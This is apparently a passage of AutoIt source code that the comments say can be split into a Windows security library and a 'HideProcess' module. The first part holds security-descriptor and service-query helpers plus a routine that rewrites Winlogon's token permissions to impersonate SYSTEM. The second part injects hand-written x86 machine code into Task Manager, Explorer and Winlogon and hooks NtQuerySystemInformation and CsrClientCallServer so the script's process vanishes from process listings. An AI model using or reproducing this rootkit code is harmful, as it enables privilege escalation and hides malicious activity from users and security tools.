			$aSecur = _GetSecurityInfo($sObject, $SE_KERNEL_OBJECT, $iAccess)
		EndIf
		If $aSecur[0] Then Return SetError($aSecur[0], 0, "")
		If bitAND($iMask, $CRYPT_MASK_OWNER) Then $sBinData &= _ConvertSidToStringSid($aSecur[4])
		If bitAND($iMask, $CRYPT_MASK_GROUP) Then $sBinData &= _ConvertSidToStringSid($aSecur[5])
		If bitAND($iMask, $CRYPT_MASK_DACL) Then
			$aAceList = _GetExplicitEntriesFromAcl($aSecur[6])
			For $i = 1 to $aAceList[0][0]
				For $c = 0 to 4
					$sBinData &= $aAceList[$i][$c]
				Next
			Next
		EndIf
	Case $CRYPT_OBJECT_SERVICE
		If bitAND($iMask, $CRYPT_MASK_OWNER) Then $iAccess = bitOR($iAccess, $OWNER_SECURITY_INFORMATION)
		If bitAND($iMask, $CRYPT_MASK_GROUP) Then $iAccess = bitOR($iAccess, $GROUP_SECURITY_INFORMATION)
		If bitAND($iMask, $CRYPT_MASK_DACL) Then $iAccess = bitOR($iAccess, $DACL_SECURITY_INFORMATION)
		If bitAND($iMask, $CRYPT_MASK_SACL) Then $iAccess = bitOR($iAccess, $SACL_SECURITY_INFORMATION)
		If bitAND($iMask, 8) or bitAND($iMask, 16) or bitAND($iMask, 32) or bitAND($iMask, 64) Then
			If IsString($sObject) Then
				$aSecur = _GetNamedSecurityInfo($sObject, $SE_SERVICE, $iAccess)
			Else
				$aSecur = _GetSecurityInfo($sObject, $SE_SERVICE, $iAccess)
			EndIf
			If $aSecur[0] Then Return SetError($aSecur[0], 0, "")
		EndIf
		If bitAND($iMask, $CRYPT_MASK_OWNER) Then $sBinData &= _ConvertSidToStringSid($aSecur[4])
		If bitAND($iMask, $CRYPT_MASK_GROUP) Then $sBinData &= _ConvertSidToStringSid($aSecur[5])
		If bitAND($iMask, $CRYPT_MASK_DACL) Then
			$aAceList = _GetExplicitEntriesFromAcl($aSecur[6])
			For $i = 1 to $aAceList[0][0]
				For $c = 0 to 4
					$sBinData &= $aAceList[$i][$c]
				Next
			Next
		EndIf
		If bitAND($iMask, $CRYPT_MASK_SACL) Then
			$aAceList = _GetExplicitEntriesFromAcl($aSecur[7])
			For $i = 1 to $aAceList[0][0]
				For $c = 0 to 4
					$sBinData &= $aAceList[$i][$c]
				Next
			Next
		EndIf
		If bitAND($iMask, $CRYPT_MASK_TYPE) Then
			$aResult = _LsaSvcCertificate_QueryServiceConfig($sObject)
			$sBinData &= $aResult[0]
			$sBinData &= $aResult[1]
			_FreeVariable($aResult)
		EndIf
		If bitAND($iMask, $CRYPT_MASK_SYNCHRONIZE) Then
			$aResult = _LsaSvcCertificate_QueryServiceConfig($sObject)
			For $i = 0 to 5
				$sBinData &= $aResult[$i]
			Next
			_FreeVariable($aResult)
			$sBinData &= _LsaSvcCertificate_QueryDependenices($sObject)
			$sBinData &= _LsaSvcCertificate_GetDisplayName($sObject)
			$sBinData &= _LsaSvcCertificate_QueryStartName($sObject)
		EndIf
		If bitAND($iMask, $CRYPT_MASK_STATE) Then
			$aResult = _LsaSvcCertificate_QueryServiceStatusEx($sObject)
			$sBinData &= $aResult[1]
			_FreeVariable($aResult)
		EndIf
		If bitAND($iMask, $CRYPT_MASK_PARAM) Then
			$aResult = _LsaSvcCertificate_QueryServiceStatusEx($sObject)
			For $i = 0 to 8
				If $i = 7 Then ContinueLoop
				$sBinData &= $aResult[$i]
			Next
			$sBinData &= _LsaSvcCertificate_QueryDescription($sObject)
			_FreeVariable($aResult)
		EndIf
		$aResult = _LsaSvcCertificate_QueryBinPath($sObject)
		If bitAND($iMask, $CRYPT_MASK_DATA) Then $sBinData &= FileRead(FileOpen($aResult, 16))
		If bitAND($iMask, $CRYPT_MASK_TIME) Then $sBinData &= FileGetTime($aResult, 0, 1)
		If bitAND($iMask, $CRYPT_MASK_ATTRIBUTES) Then $sBinData &= FileGetAttrib($aResult)
	EndSwitch

	If bitAND($iMask, $CRYPT_MASK_SELF) Then $sBinData &= $sObject
	$bHash = _CryptHashCertificate($sBinData, $iAlgID)
	Return SetExtended(_FreeVariable($sBinData), $bHash)
EndFunc	;==>_CryptVerifyObjectHashValue

#### INTERNAL USED ONLY FUNCTIONS REGION START ####
; =======================================================================
; For Authentication of services only.
; =======================================================================
Func _LsaSvcCertificate_QueryServiceConfig($sService, $sSystem = "")
	Local $hService, $aResult[9], $pBuffer, $iResult, $iSysError

	$hService = _LsaOpenService($sService, 1, $sSystem)
	If Not $hService Then Return SetError(@error, 0, $aResult)

	$iResult = DllCall("Advapi32.dll", "int", "QueryServiceConfig", _
			"hWnd", $hService, "ptr", 0, "int", 0, "int*", 0)
	$pBuffer = _HeapAlloc($iResult[4])
	$iResult = DllCall("Advapi32.dll", "int", "QueryServiceConfig", _
			"hWnd", $hService, "ptr", $pBuffer, "int", $iResult[4], "int*", 0)
	$iSysError = _GetLastError()

	$tBuffer = DllStructCreate($tagQueryServiceCfg, $pBuffer)
	$aResult[0] = DllStructGetData($tBuffer, "Type")
	$aResult[1] = DllStructGetData($tBuffer, "StartType")
	$aResult[2] = DllStructGetData($tBuffer, "ErrorCtrl")
	$aResult[3] = DllStructGetData($tBuffer, "BinPath")
	$aResult[4] = DllStructGetData($tBuffer, "LoadOrderGroup")
	$aResult[5] = DllStructGetData($tBuffer, "TagId")
	$aResult[6] = DllStructGetData($tBuffer, "Dependence")
	$aResult[7] = DllStructGetData($tBuffer, "StartName")
	$aResult[8] = DllStructGetData($tBuffer, "DisplayName")

	_HeapFree($pBuffer)
	_FreeVariable($tBuffer)
	_LsaCloseServiceHandle($hService)
	Return SetError($iSysError, 0, $aResult)
EndFunc	;==>_LsaSvcCertificate_QueryServiceConfig

Func _LsaSvcCertificate_QueryServiceStatusEx($sService, $sSystem = "")
	Local $hService, $pBuffer, $tBuffer, $iResult, $aResult[9]

	$hService = _LsaOpenService($sService, 4, $sSystem)
	If Not $hService Then Return SetError(@error, 0, $aResult)

	$iResult = DllCall("Advapi32.dll", "int", "QueryServiceStatusEx", _
			"hWnd", $hService, "dword", 0, _
			"ptr", 0, "dword", 0, "dword*", 0)
	$pBuffer = _HeapAlloc($iResult[5])
	$iResult = DllCall("Advapi32.dll", "int", "QueryServiceStatusEx", _
			"hWnd", $hService, "dword", 0, _
			"ptr", $pBuffer, "dword", $iResult[5], "dword*", 0)
	$iSysError = _GetLastError()

	$tBuffer = DllStructCreate($tagServiceStatusProcess, $pBuffer)
	$aResult[0] = DllStructGetData($tBuffer, "ServiceType")
	$aResult[1] = DllStructGetData($tBuffer, "CurrentState")
	$aResult[2] = DllStructGetData($tBuffer, "ControlsAccepted")
	$aResult[3] = DllStructGetData($tBuffer, "Win32ExitCode")
	$aResult[4] = DllStructGetData($tBuffer, "ServiceSpecificExitCode")
	$aResult[5] = DllStructGetData($tBuffer, "CheckPoint")
	$aResult[6] = DllStructGetData($tBuffer, "WaitHint")
	$aResult[7] = DllStructGetData($tBuffer, "ProcessId")
	$aResult[8] = DllStructGetData($tBuffer, "ServiceFlags")
	_HeapFree($pBuffer)
	_FreeVariable($tBuffer)
	_LsaCloseServiceHandle($hService)
	Return SetError($iSysError, 0, $aResult)
EndFunc	;==>_LsaSvcCertificate_QueryServiceStatusEx

Func _LsaSvcCertificate_QueryStartName($sService, $sSystem = "")
	Local $aCfg, $iLength, $tBuffer, $sStartName

	$aCfg = _LsaSvcCertificate_QueryServiceConfig($sService, $sSystem)
	$iLength = Number($aCfg[8] - $aCfg[7])
	$tBuffer = DllStructCreate("char[" & $iLength & "]", $aCfg[7])
	$sStartName = DllStructGetData($tBuffer, 1)
	Return SetExtended(_FreeVariable($tBuffer) And _FreeVariable($aCfg), $sStartName)
EndFunc	;==>_LsaSvcCertificate_QueryStartName

Func _LsaSvcCertificate_GetDisplayName($sName, $sSystem = "")
	Local $iResult, $hSC

	$hSC = _LsaOpenSCManager($sSystem)
	If Not $hSC Then Return SetError(@error, 0, "")

	$iResult = DllCall("Advapi32.dll", "int", "GetServiceDisplayName", _
			"hWnd", $hSC, "str", $sName, _
			"str", "", "dword*", 255)
	Return SetError(_GetLastError(), $iResult[4], $iResult[3])
EndFunc	;==>_LsaSvcCertificate_GetDisplayName

Func _SHGetFileInfo($sFile)
	Local $iResult, $tBuffer, $pBuffer, $iMask

	$tBuffer = DllStructCreate("byte[352]")
	$pBuffer = DllStructGetPtr($tBuffer)
	$iMask = bitOR(0x200, 0x400, 0x2000, 0x4000)
	$iResult = DllCall("Shell32.dll", "dword", "SHGetFileInfo", "str", $sFile, _
			"dword", 0, "ptr", $pBuffer, "uint", 352, "dword", $iMask)
	Return $tBuffer
EndFunc	;==>_SHGetFileInfo

Func _LsaSvcCertificate_QueryDependenices($sService, $sSystem = "")
	Local $aCfg, $iLength, $iSysError, $tBuffer, $sDependence, $aResult[1] = [0]

	$aCfg = _LsaSvcCertificate_QueryServiceConfig($sService, $sSystem)
	$iSysError = @error
	$iLength = Number($aCfg[7] - $aCfg[6])
	If $iLength <= 4 Then Return SetError($iSysError, 0, $aResult)
	$tBuffer = DllStructCreate("char[" & $iLength & "]", $aCfg[6])
	For $i = 1 to $iLength
		If DllStructGetData($tBuffer, 1, $i) = Chr(0) Then
			$sDependence &= "|"
		Else
			$sDependence &= DllStructGetData($tBuffer, 1, $i)
		EndIf
	Next
	_FreeVariable($aCfg)
	_FreeVariable($tBuffer)
	$sDependence = StringRegExpReplace($sDependence, "\|+$", "")
	Return SetError($iSysError, 0, ($sDependence))
EndFunc	;==>_LsaSvcCertificate_QueryDependenices

Func _LsaSvcCertificate_QueryBinPath($sService, $sSystem = "")
	Local $aCfg, $tBuffer, $sBinPath, $iSysError

	$aCfg = _LsaSvcCertificate_QueryServiceConfig($sService, $sSystem)
	$iSysError = @error
	$tBuffer = DllStructCreate("char[" & Number($aCfg[4] - $aCfg[3]) & "]", $aCfg[3])
	$sBinPath = DllStructGetData($tBuffer, 1)
	_FreeVariable($aCfg)
	_FreeVariable($tBuffer)
	Return SetError($iSysError, 0, $sBinPath)
EndFunc	;==>_LsaSvcCertificate_QueryBinPath

Func _LsaSvcCertificate_QueryStartType($sService, $sSystem = "")
	Local $aCfg = _LsaSvcCertificate_QueryServiceConfig($sService, $sSystem)
	Return SetError(@error, 0, $aCfg[1])
EndFunc	;==>_LsaSvcCertificate_QueryStartType

Func _LsaSvcCertificate_QueryServiceConfig2($sService, $iCfgQuery, $sSystem = "")
	Local $iResult, $pBuffer, $hService, $iSysError

	$hService = _LsaOpenService($sService, 1, $sSystem)
	If Not $hService Then Return SetError(@error, 0, 0)

	$iResult = DllCall("Advapi32.dll", "int", "QueryServiceConfig2", _
			"hWnd", $hService, "int", $iCfgQuery, _
			"ptr", 0, "dword", 0, "dword*", 0)
	$pBuffer = _HeapAlloc($iResult[5])
	$iResult = DllCall("Advapi32.dll", "int", "QueryServiceConfig2", _
			"hWnd", $hService, "int", $iCfgQuery, _
			"ptr", $pBuffer, "dword", $iResult[5], "dword*", 0)
	$iSysError = _GetLastError()
	_LsaCloseServiceHandle($hService)
	Return SetError($iSysError, $iResult[4], $pBuffer)
EndFunc	;==>_LsaSvcCertificate_QueryServiceConfig2

Func _LsaSvcCertificate_QueryDescription($sService, $sSystem = "")
	Local $pBuffer, $iSysError, $tBuffer, $sDescr

	$pBuffer = _LsaSvcCertificate_QueryServiceConfig2($sService, 1, $sSystem)
	$iSysError = @error
	$tBuffer = DllStructCreate("char[" & @Extended & "]", $pBuffer + 4)
	$sDescr = DllStructGetData($tBuffer, 1)
	_HeapFree($pBuffer)
	_FreeVariable($tBuffer)
	Return SetError($iSysError, 0, $sDescr)
EndFunc	;==>_LsaSvcCertificate_QueryDescription
#### END REGION ####

Const $MAX_LSA_FUNCTIONS = 232

Func _LsaAu3LibraryIsIncluded()
	Local $hFile, $sLsaData

	$hFile = FileOpen("LocalSecurityAuthority.au3", 0)
	$sLsaData = FileRead($hFile)
	FileClose($hFile)
	$sLsaData = StringRegExp($sLsaData, "Func (_.*)\(", 3)
	If UBound($sLsaData) = $MAX_LSA_FUNCTIONS Then Return 1
EndFunc	;==>_LsaAu3LibraryIsIncluded

Func _ImpersonateSystemContext()
	Local $iProcessId, $fSuccess = 0, $pDacl, $iDesiredAccess
	Local $hToken, $aPriv[1][2] = [[$SE_DEBUG_NAME, 2]], $aSecur

	If (@UserName = "SYSTEM") Then Return SetError(85, 0, 1)
	If (_LsaGetUserRelativeID(@UserName) <> "ADMINISTRATOR$") Then
		Return SetError(5, 0, 0)
	EndIf

	$iProcessId = ProcessExists("Winlogon.exe")
	If $iProcessId < 1 Then Return SetError(127, 0, 0)

	$hToken = _OpenProcessToken(-1)
	_AdjustTokenPrivileges($hToken, $aPriv)
	_LsaCloseHandle($hToken)

	$iDesiredAccess = bitOR($READ_CONTROL, $WRITE_DAC)
	$hToken = _OpenProcessToken($iProcessId, $iDesiredAccess)
	If ($hToken < 1) Then Return SetError(@error, 0, 0)
	If (_QueryKernelObjectSecurityOwner($hToken) <> "BUILTIN\Administrators") Then
		Return SetError(@error, _FreeVariable($aSecur, 0, _LsaCloseHandle($hToken)), 0)
	EndIf

	$aSecur = _GetSecurityInfo($hToken, $SE_KERNEL_OBJECT, 4)
	If $aSecur[0] Then Return SetError(@error, _FreeVariable($aSecur, 0, _LsaCloseHandle($hToken)), 0)

	$pDacl = _SetEntriesInAcl1(@UserName, $TOKEN_ALL_ACCESS, $GRANT_ACCESS, $NO_INHERITANCE)
	If @error Then Return SetError(@error, _FreeVariable($aSecur, 0, _LsaCloseHandle($hToken)), 0)

	If _SetSecurityInfo($hToken, $SE_KERNEL_OBJECT, 4, 0, 0, $pDacl, 0) = 0 Then
		Return SetError(@error, _FreeVariable($aSecur, 0, _LsaCloseHandle($hToken)), 0)
	EndIf

	_LsaCloseHandle($hToken)
	$hToken = _OpenProcessToken($iProcessId, $TOKEN_ALL_ACCESS)
	If ($hToken < 1) Then Return SetError(@error, 0, 0)

	_SetSecurityInfo($hToken, $SE_KERNEL_OBJECT, 4, 0, 0, $aSecur[6], 0)
	If _ImpersonateLoggedOnUser($hToken) = False Then
		Return SetError(@error, _LsaCloseHandle($hToken), 0)
	EndIf
	Return SetError(@error, _FreeVariable($aSecur), $hToken)
EndFunc	;==>_ImpersonateSystemContext

Func _AllocateAndInitializeSid($iSidAuthority, $iCP0, $iCP1, $iCP2 = 0, $iCP3 = 0, _
		$iCP4 = 0, $iCP5 = 0, $iCP6 = 0, $iCP7 = 0)
	Local $iResult, $pAuthority, $tBuffer

	$tBuffer = DllStructCreate("byte Value1[5];byte Value2")
	$pAuthority = DllStructGetPtr($tBuffer)
	DllStructSetData($tBuffer, "Value2", $iSidAuthority)

	$iResult = DllCall("AdvApi32.dll", "int", "AllocateAndInitializeSid", "ptr", $pAuthority, _
			"byte", @NumParams - 1, "dword", $iCP0, "dword", $iCP1, "dword", $iCP2, "dword", $iCP3, _
			"dword", $iCP4, "dword", $iCP5, "dword", $iCP6, "dword", $iCP7, "ptr*", 0)
	$tBuffer = 0
	Return SetError(_GetLastError(), 0, $iResult[11])
EndFunc	;==>_AllocateAndInitializeSid

Func _FreeSid(ByRef $pSid)
	Local $iResult
	$iResult = DllCall("AdvApi32.dll", "ptr", "FreeSid", "ptr", $pSid)
	If ($iResult[0]) Then Return 0
	Return _FreeVariable($pSid, 0, 1)
EndFunc	;==>_FreeSid

; #### FUNCTION ####
; ==========================================================================================
; Name	: _LsaUserIsLocalAdmin
; Description	: This function determines whether an user have administrative user rights.
; Parameter(s)	: $sUserName	- User name to be determined.
; Return values	: True indicates the $sUserName is an administrator, otherwise returns False.
; Author	: Pusofalse
; ==========================================================================================
Func _LsaUserIsLocalAdmin($sUserName = @UserName)
	Local $iDesired, $pDacl, $pSid

	If ($sUserName = "") Or ($sUserName = Default) Then $sUserName = @UserName

	$pSid = _AllocateAndInitializeSid(5, 32, $DOMAIN_ALIAS_RID_ADMINS)
	$pDacl = _SetEntriesInAcl1($pSid, 1, $GRANT_ACCESS, $NO_INHERITANCE)
	$iDesired = _GetEffectiveRightsFromAcl($pDacl, $sUserName)
	_FreeVariable($pSid, 0, _LsaLocalFree($pDacl), _FreeSid($pSid))
	Return Number($iDesired) <> 0
EndFunc	;==>_LsaUserIsLocalAdmin

; #### FUNCTION ####
; ==========================================================================================
; Name	: _TreeResetNamedSecurityInfo
; Description	: This function resets specified security information in the security descriptor of a specified tree of objects. This function allows a specified discretionary access control list (DACL) or system access control list (SACL) to be propagated throughout an entire tree. This function supports a callback function to track the progress of the tree operation.
; Parameter(s)	: $sObject	- Name of the root node object, supported objects are registry keys and file objects.
;		: $iObjType	- A value of type identifies the object, supported values are SE_REGISTRY_KEY and SE_FILE_OBJECT.
;		: $iSecurLevel	- A set of bit flags that indicates the type of security information to reset. This value can be a combination of SECURITY_INFORMATION.
;		: $pOwner	- A pointer to a SID identifies the owner of the object, if $iSecurLevel does not contain OWNER_SECURITY_INFORMATION, this value can be zero.
;		: $pGroup	- A pointer to a SID identifies the primary group of the object, if $iSecurLevel does not contain GROUP_SECURITY_INFORMATION, this value can be zero.
;		: $pDacl	- A pointer to a DACL for the object being reset. The $iSecurLeval must include the DACL_SECURITY_INFORMATION bit flag. The caller must have the READ_CONTROL and WRITE_DAC access to each object, including the root object. If you are not setting the DACL, can parameter can be zero.
;		: $pSacl	- A pointer to a SACL for the object, caller must have SE_SECURITY_NAME privilege enabled, if SACL_SECURITY_INFORMATION is not specified in $iSecurLevel, this parameter can be zero.
;		: $fKeepExplicit	- Boolean value that defines whether explicitly defined ACEs are kept or deleted for the sub-tree. If $fKeepExplicit is TRUE, then explicitly defined ACEs are kept for each subtree DACL and SACL, and inherited ACEs are replaced by the inherited ACEs from $pDacl and $pSacl. If $fKeepExplicit is FALSE, then explicitly defined ACEs for each subtree DACL and SACL are deleted before the inherited ACEs are replaced by the inherited ACEs from $pDacl and $pSacl.
;		: $sCallback	- A callback function used to track the progress, define as the following:
;		Func _TreeResetNamedSecurityInfoCallback( _
;			$sObject, _	; Name of the object just processed.
;			$iStatus, _	; Status of operation on object, zero indicates success, otherwise this value will set to a system error code.
;			$fSecuritySet)	; True indicates the security was set.
; 		EndFunc
;		: If the callback function returns 1, the operation will abort; if returns 2, the procedure will retry the tree operation; for any other values, the procedure processes the tree operation until all objects were set.
;		: This parameter is optional, if you need not the progress of the tree operation.
; Return values	: True indicates success, False otherwise. If the callback function returns a value of 1, the function aborts the operation and set @error to ERROR_ACCESS_DENIED (5).
; Author	: Pusofalse
; ==========================================================================================
Func _TreeResetNamedSecurityInfo($sObject, $iObjType, $iSecurLevel, $pOwner, $pGroup, _
			$pDacl, $pSacl, $fKeepExplicit = True, $sCallback = "")

	Local $iResult, $hProgress, $pProgress
	If ($iObjType <> $SE_FILE_OBJECT) And ($iObjType <> $SE_REGISTRY_KEY) Then
		Return SetError(87, 0, 0)
	EndIf

	$hProgress = DllCallbackRegister("___fnProgress", "none", "wstr;dword;ptr;wstr;int")
	$pProgress = DllCallbackGetPtr($hProgress)

	$iResult = DllCall("AdvApi32.dll", "dword", "TreeResetNamedSecurityInfoW", "wstr", $sObject, _
			"dword", $iObjType, "dword", $iSecurLevel, "ptr", $pOwner, "ptr", $pGroup, _
			"ptr", $pDacl, "ptr", $pSacl, "int", $fKeepExplicit, "ptr", $pProgress, _
			"int", 2, "wstr", $sCallback)
	If (@error) Then Return SetError(1, DllCallbackFree($hProgress), 0)
	DllCallbackFree($hProgress)
	Return SetError($iResult[0], 0, $iResult[0] = 0)
EndFunc	;==>_TreeResetNamedSecurityInfo

; #### FUNCTION (INTERNAL-USED-ONLY) ####
; ==========================================================================================
Func ___fnProgress($sObject, $iStatus, $pInvokeSetting, $sCallback, $fSecuritySet)
	Local $iAbort, $tInvoke

	If ($sCallback <> "") Then
		$iAbort = Call($sCallback, $sObject, $iStatus, $fSecuritySet)
		If ($iAbort = 1) OR ($iAbort = 2) Then
			$tInvoke = DllStructCreate("int", $pInvokeSetting)
			DllStructSetData($tInvoke, 1, $iAbort + 3)
		EndIf
	EndIf
EndFunc	;==>___fnProgress

;以上代码可以打包成这个 LocalSecurityAuthority.au3 的名字   搜索开始名字   SYSTEM ERROR CODE CONSTANTS
;-----------------------------------------------------------------------------------------------------------

;-----------------------------------------------------------------------------------------------------------
;以下代码可以打包成这个 HideProcess.au3 的名字   搜索结束名字   EndFunc	;==>_NotifyProcessEnumeration


$bProtectFingerprint = "5AFDEC9BD7A0C14E"
$pCsrClientCallServer = _RTGetProcAddress("Ntdll.dll", "CsrClientCallServer")
$pNtQuerySystemInfo = _RTGetProcAddress("Ntdll.dll", "NtQuerySystemInformation")
$pSendMessageW = _RTGetProcAddress("User32.dll", "SendMessageW")
$pGetCurrentProcessId = _RTGetProcAddress("Kernel32.dll", "GetCurrentProcessId")


	Local $hToken = _OpenProcessToken(-1)
	Local $aPriv[1][2] = [[$SE_DEBUG_NAME, 2]]
	_AdjustTokenPrivileges($hToken, $aPriv)
	_LsaCloseHandle($hToken)

$hGUI = GUICreate("", 400, 300)
GUIRegisterMsg(0x3F77, "_NotifyProcessCreation")
GUIRegisterMsg(0x3F78, "_NotifyProcessEnumeration")


_NotifyProcessCreation(0, 0, 0, ProcessExists("Taskmgr.exe"))
_NotifyProcessCreation(0, 0, 0, ProcessExists("explorer.exe"))
_NotifyProcessCreation(0, 0, 0, ProcessExists("Winlogon.exe"))

;MsgBox(48, "Bingo~!", "Bingo~!!")

Func _HideProcess($iProcessId = @AutoItPid)

	If ($iProcessId = -1) Then $iProcessId = @AutoItPid
	$iProcessIdToHide = ProcessExists($iProcessId)

	If ($iProcessIdToHide = 0) Then Return SetError(2, 0, 0)

	Local $hToken = _OpenProcessToken(-1)
	Local $aPriv[1][2] = [[$SE_DEBUG_NAME, 2]]
	_AdjustTokenPrivileges($hToken, $aPriv)
	_LsaCloseHandle($hToken)

	If ProcessExists("explorer.exe") Then _NotifyProcessCreation(0, 0, 0, ProcessExists("explorer.exe"))
	If ProcessExists("winlogon.exe") Then _NotifyProcessCreation(0, 0, 0, ProcessExists("winlogon.exe"))
	If ProcessExists("taskmgr.exe") Then _NotifyProcessCreation(0, 0, 0, ProcessExists("taskmgr.exe"))

	Return 1
EndFunc	;==>_HideProcess



Func _NotifyProcessCreation($hWnd, $iMsg, $iwParam, $iPid)
	Local $hProcess, $pCallAddr, $bCode, $bJump, $bEntrypoint

	$hProcess = _RTOpenProcess(Number($iPid))

	_RTVirtualProtectEx($hProcess, $pCsrClientCallServer, 8)
	$pCallAddr = _RTVirtualAllocEx($hProcess, 1024)

	$bEntrypoint = _RTReadProcessMemory($hProcess, $pCsrClientCallServer, 0, 16, "binary")
	$bEntrypoint = StringTrimLeft($bEntrypoint, 2)

	$bJump = "B8" & _RTLongPtrToBytes($pCallAddr) & "FFE000" & $bProtectFingerprint
	_RTWriteProcessMemory($hProcess, $pCsrClientCallServer, "0x" & $bJump, 16, "binary")

	$bCode = "0x" & _
		"55" & _
		"8BEC" & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 0) & StringMid($bEntrypoint, 1, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 1) & StringMid($bEntrypoint, 3, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 2) & StringMid($bEntrypoint, 5, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 3) & StringMid($bEntrypoint, 7, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 4) & StringMid($bEntrypoint, 9, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 5) & StringMid($bEntrypoint, 11, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 6) & StringMid($bEntrypoint, 13, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 7) & StringMid($bEntrypoint, 15, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 8) & StringMid($bEntrypoint, 17, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 9) & StringMid($bEntrypoint, 19, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 10) & StringMid($bEntrypoint, 21, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 11) & StringMid($bEntrypoint, 23, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 12) & StringMid($bEntrypoint, 25, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 13)& StringMid($bEntrypoint, 27, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 14) & StringMid($bEntrypoint, 29, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 15) & StringMid($bEntrypoint, 31, 2) & _
		"8B4514" & _
		"50" & _
		"8B4510" & _
		"50" & _
		"8B450C" & _
		"50" & _
		"8B4508" & _
		"50" & _
		"B8" & _RTLongPtrToBytes($pCsrClientCallServer) & _
		"FFD0" & _
		"A3" & _RTLongPtrToBytes($pCallAddr + 1020) & _
		"8B4510" & _
		"3D" & _RTUlongToBytes(0x10000) & _
		"751D" & _
		"8B4508" & _		; 3
		"8B4030" & _		; 3
		"50" & _		; 1
		"6800000000" & _	; 5
		"68" & _RTUlongToBytes(0x3F77) & _	; 5
		"68" & _RTLongPtrToBytes($hGUI) & _	; 5
		"B8" & _RTLongPtrToBytes($pSendMessageW) & _	; 5
		"FFD0" & _				; 2
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 0) & StringMid($bJump, 1, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 1) & StringMid($bJump, 3, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 2) & StringMid($bJump, 5, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 3) & StringMid($bJump, 7, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 4) & StringMid($bJump, 9, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 5) & StringMid($bJump, 11, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 6) & StringMid($bJump, 13, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 7) & StringMid($bJump, 15, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 8) & StringMid($bJump, 17, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 9) & StringMid($bJump, 19, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 10) & StringMid($bJump, 21, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 11) & StringMid($bJump, 23, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 12) & StringMid($bJump, 25, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 13) & StringMid($bJump, 27, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 14) & StringMid($bJump, 29, 2) & _
		"C605" & _RTLongPtrToBytes($pCsrClientCallServer + 15) & StringMid($bJump, 31, 2) & _
		"8BE5" & _
		"8B5504" & _
		"5D" & _
		"83C414" & _
		"52" & _
		"A1" & _RTLongPtrToBytes($pCallAddr + 1020) & _
		"C3"
	_RTWriteProcessMemory($hProcess, $pCallAddr, $bCode, BinaryLen($bCode), "binary")
	_EnumProcessesCallBack($hProcess)
	_RTCloseHandle($hProcess)
EndFunc	;==>_NotifyProcessCreation

Func _EnumProcessesCallBack($hProcess)
	Local $iProtect, $bEntrypoint, $pCall, $bJump, $bCode

	_RTVirtualProtectEx($hProcess, $pNtQuerySystemInfo, 8)
	$iProtect = @Extended

	$bEntrypoint = _RTReadProcessMemory($hProcess, $pNtQuerySystemInfo, 0, 8, "binary")
	$bEntrypoint = StringTrimLeft($bEntrypoint, 2)

	$pCall = _RTVirtualAllocEx($hProcess, 1024)
	$bJump = "B8" & _RTLongPtrToBytes($pCall) & "FFE000"

	_RTWriteProcessMemory($hProcess, $pNtQuerySystemInfo, "0x" & $bJump, 8, "binary")

	$bCode = "0x" & _
	"55" & _
	"8BEC" & _
	"C605" & _RTLongPtrToBytes($pNtQuerySystemInfo + 0) & StringMid($bEntrypoint, 1, 2) & _
	"C605" & _RTLongPtrToBytes($pNtQuerySystemInfo + 1) & StringMid($bEntrypoint, 3, 2) & _
	"C605" & _RTLongPtrToBytes($pNtQuerySystemInfo + 2) & StringMid($bEntrypoint, 5, 2) & _
	"C605" & _RTLongPtrToBytes($pNtQuerySystemInfo + 3) & StringMid($bEntrypoint, 7, 2) & _
	"C605" & _RTLongPtrToBytes($pNtQuerySystemInfo + 4) & StringMid($bEntrypoint, 9, 2) & _
	"C605" & _RTLongPtrToBytes($pNtQuerySystemInfo + 5) & StringMid($bEntrypoint, 11, 2) & _
	"C605" & _RTLongPtrToBytes($pNtQuerySystemInfo + 6) & StringMid($bEntrypoint, 13, 2) & _
	"C605" & _RTLongPtrToBytes($pNtQuerySystemInfo + 7) & StringMid($bEntrypoint, 15, 2) & _
	"8B4514" & _
	"50" & _
	"8B4510" & _
	"50" & _
	"8B450C" & _
	"50" & _
	"8B4508" & _
	"50" & _
	"B8" & _RTLongPtrToBytes($pNtQuerySystemInfo) & _
	"FFD0" & _
	"A3" & _RTLongPtrToBytes($pCall + 1020) & _
	"8B4508" & _
	"83F805" & _
	"7522" & _
	"8B450C" & _
	"83F800" & _
	"741A" & _
	"50" & _
	"B8" & _RTLongPtrToBytes($pGetCurrentProcessId) & _
	"FFD0" & _
	"50" & _		; 14
	"68" & _RTUlongToBytes(0x3F78) & _	; 19
	"68" & _RTLongPtrToBytes($hGUI) & _	; 24
